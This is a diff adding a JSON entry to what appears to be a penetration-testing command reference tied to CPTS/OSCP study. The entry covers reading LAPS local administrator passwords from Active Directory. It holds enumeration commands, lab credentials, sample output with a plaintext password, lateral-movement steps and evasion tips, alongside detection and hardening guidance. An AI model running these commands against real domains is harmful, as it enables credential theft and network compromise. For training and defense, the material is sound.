@@ -1,0 +1,87 @@
+{
+  "id": "ad-laps-read",
+  "name": "LAPSToolkit - Read LAPS Passwords",
+  "command": "Get-LAPSComputers",
+  "description": "Reads LAPS (Local Administrator Password Solution) passwords from AD. LAPS stores randomized local admin passwords for each machine in the ms-Mcs-AdmPwd attribute. Any user in an authorized group (or with read rights on that attribute) can retrieve the current local admin password. Get-LAPSComputers shows all machines + their current passwords.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "silent",
+  "category": "Credential Access",
+  "subcategory": "Miscellaneous Misconfigurations",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "laps",
+    "local-admin",
+    "credential-hunting",
+    "lateral-movement",
+    "lapstoolkit"
+  ],
+  "mitre": [
+    "T1555"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== HOW LAPS WORKS ===\nLAPS assigns a unique random password to the local Administrator account on each\njoined machine, rotates it on a schedule, and stores it encrypted in AD:\n  - Computer object attribute: ms-Mcs-AdmPwd (plaintext password)\n  - Computer object attribute: ms-Mcs-AdmPwdExpirationTime (rotation schedule)\n\nOnly authorized groups/users can READ ms-Mcs-AdmPwd. By default:\n  - Domain Admins\n  - Custom groups defined during LAPS deployment\n\n=== FINDING WHO CAN READ LAPS ===\n  Find-LAPSDelegatedGroups     → groups with read rights to LAPS passwords\n  Find-AdmPwdExtendedRights    → which accounts/groups have extended rights on computers\n\nIf any of these groups include accounts you control: you can read LAPS passwords.\n\n=== GET-LAPSCOMPUTERS OUTPUT ===\n  Computername  Password            Expiration\n  ACADEMY-EA-MS01  AdmPwd!2022     9/28/2024 9:14:42 AM\n  ACADEMY-EA-MX01  (blank)         (blank — LAPS not deployed on this machine)\n\n=== ALTERNATIVES TO LAPSTOOLKIT ===\n  crackmapexec ldap <dc_ip> -u user -p pass --kdcHost <dc> -M laps\n  Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd\n\n=== VALUE OF LAPS PASSWORDS ===\n  1. Local admin on THAT machine → dump SAM → cached domain creds\n  2. Spray across subnet (--local-auth) → other machines with same password (post-LAPS check)\n  3. Access to a Tier 0 machine with LAPS if you have read rights\n  4. Machines often share local admin names ('administrator') — PtH across subnet",
+  "examples": [
+    {
+      "label": "Read all LAPS passwords",
+      "command": "Get-LAPSComputers"
+    },
+    {
+      "label": "Find groups delegated to read LAPS",
+      "command": "Find-LAPSDelegatedGroups"
+    },
+    {
+      "label": "Find accounts with extended rights on computer objects",
+      "command": "Find-AdmPwdExtendedRights"
+    },
+    {
+      "label": "CME LAPS module (from Linux)",
+      "command": "crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 -M laps"
+    }
+  ],
+  "references": [
+    {
+      "title": "LAPSToolkit (leoloobeek)",
+      "url": "https://github.com/leoloobeek/LAPSToolkit"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "pth-evilwinrm",
+      "rel": "next",
+      "note": "Log in as local admin with the recovered password."
+    }
+  ],
+  "defense": {
+    "why_it_works": "LAPS stores the current randomized local Administrator password for each managed computer in the ms-Mcs-AdmPwd attribute on the computer object in AD. The ACL on this attribute grants read access only to specified principals (LAPS Readers group, designated admin accounts). If an attacker compromises any account with that read permission — including via ACL abuse (GenericAll/WriteDACL on the computer object) — they can retrieve plaintext local admin passwords for any covered machine via LDAP.",
+    "prerequisites": "Control of an account with read access on ms-Mcs-AdmPwd for target computer objects. LAPSToolkit or PowerView, or simply Get-ADComputer -Properties ms-Mcs-AdmPwd. Domain membership.",
+    "impact": "Plaintext local Administrator password for target machines — immediate local admin access via pass-the-password (no cracking needed). Can pivot to every LAPS-covered machine the compromised account has read rights on. If LAPS covers DCs, reading a DC's LAPS password = domain administrator access.",
+    "detection": "LDAP read of the ms-Mcs-AdmPwd attribute — Event 4662 if SACL auditing is configured on the computer objects for this attribute (requires explicit audit policy setup, not default). Mass enumeration of LAPS passwords across many computers in rapid succession is anomalous and may be detected by SIEM behavioral analytics. Microsoft Defender for Identity may flag LAPS enumeration patterns.",
+    "prevention": "Restrict the LAPS Readers group membership to only authorized administrators — audit quarterly. Enable SACL auditing on computer objects for ms-Mcs-AdmPwd attribute reads (Event 4662). Separate LAPS reader access by tier: Tier 0 LAPS (DC passwords) readable only from Tier 0 admin accounts, Tier 1/2 machines from appropriate tier admins. Consider upgrading to Windows LAPS (2023+) which stores encrypted passwords with improved access controls and logging. Rotate LAPS passwords after any suspected compromise.",
+    "evasion": "LDAP attribute read — completely silent without explicit SACL auditing. Target only specific machines rather than enumerating all computers. Single query returns plaintext password immediately — no cracking delay.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1555"
+    ],
+    "misconfiguration": "Administrative shortcuts create persistent misconfigurations: passwords stored in AD Description/Info attributes (visible to all users), accounts with PasswordNotRequired flag set (blank passwords allowed), LAPS attribute readable by non-admin groups, gMSA readable by unintended principals, or SYSVOL containing scripts with embedded credentials.",
+    "vulnerable_config": "# Passwords in AD Description field:\nGet-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}\n# Returns: svc_backup  Description: 'Temp password: Welcome1!'\n\n# PasswordNotRequired flag (UAC 0x20 = PASSWD_NOTREQD):\nGet-ADUser -Filter {PasswordNotRequired -eq $true}\n\n# LAPS password readable by Domain Users (misconfigured ACL):\nGet-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,'ms-Mcs-AdmPwd'\n# Should only be readable by admins + specific LAPS readers group",
+    "secure_config": "# Remove passwords from Description/Info fields:\nGet-ADUser -Filter * -Properties Description,Info |\n    Where-Object {$_.Description -match 'pass|pwd|temp|welcome'} |\n    Set-ADUser -Description $null\n\n# Fix PasswordNotRequired accounts:\nGet-ADUser -Filter {PasswordNotRequired -eq $true} |\n    Set-ADAccountControl -PasswordNotRequired $false\n\n# LAPS ACL hardening — restrict ms-Mcs-AdmPwd reads:\n# Only specific LAPS-Readers security group should have Read on this attribute\n# Run: Set-AdmPwdComputerSelfPermission, Set-AdmPwdReadPasswordPermission\n\n# Audit gMSA readers:\nGet-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |\n    Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword"
+  },
+  "tools": [
+    "PowerView",
+    "crackmapexec"
+  ]
+}
